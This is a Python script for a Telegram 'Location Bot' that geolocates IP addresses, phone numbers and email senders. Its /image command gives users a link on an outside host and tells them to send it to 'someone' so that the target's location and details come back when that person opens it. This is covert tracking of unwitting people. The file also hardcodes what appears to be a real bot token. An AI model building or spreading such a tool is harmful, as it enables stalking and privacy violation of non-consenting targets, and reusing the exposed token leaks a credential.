# === bot_script.py (FREE version - no subscription) ===

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from ip_locator import get_ip_location
from phone_locator import get_phone_info
from email_locator import get_email_location, extract_sender_ip

TELEGRAM_TOKEN = '7807744735:AAEYUDh0Y8SIdJly_fJbFNXmBHS0BdcRHTo'  # Replace with your real bot token

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "\U0001F44B Welcome to Location Bot!\nSend:\n"
        "`/ip 8.8.8.8` for IP info\n"
        "`/phone +911234567890` for phone info\n"
        "`/email <headers>` for email info\n"
        "`/image` to get a tracking image link",
        parse_mode='Markdown'
    )

async def ip_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        ip = context.args[0]
        result = get_ip_location(ip)
        await update.message.reply_text(result)
    else:
        await update.message.reply_text("⚠️ Usage: /ip 8.8.8.8")

async def phone_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        number = context.args[0]
        result = get_phone_info(number)
        await update.message.reply_text(result)
    else:
        await update.message.reply_text("⚠️ Usage: /phone +919013114845")

async def email_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    header = ' '.join(context.args)
    if header:
        ip = extract_sender_ip(header)
        if ip:
            await update.message.reply_text(f"\U0001F4E1 Extracted IP: {ip}")
            result = get_email_location(ip)
            await update.message.reply_text(result)
        else:
            await update.message.reply_text("⚠️ Could not extract IP from headers.")
    else:
        await update.message.reply_text("⚠️ Usage: /email <email headers>")

async def image_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    telegram_id = update.effective_user.id
    tracking_url = f"https://image.einitial24.com/meme.php?chat_id={telegram_id}"

    message = (
        "📸 To track someone's location, send them this image link:\n"
        f"{tracking_url}\n\n"
        "When they open the link, their info will be sent here."
    )

    await update.message.reply_text(message)

def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ip", ip_lookup))
    app.add_handler(CommandHandler("phone", phone_lookup))
    app.add_handler(CommandHandler("email", email_lookup))
    app.add_handler(CommandHandler("image", image_command))

    print("\U0001F916 Bot is running... Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == '__main__':
    main()
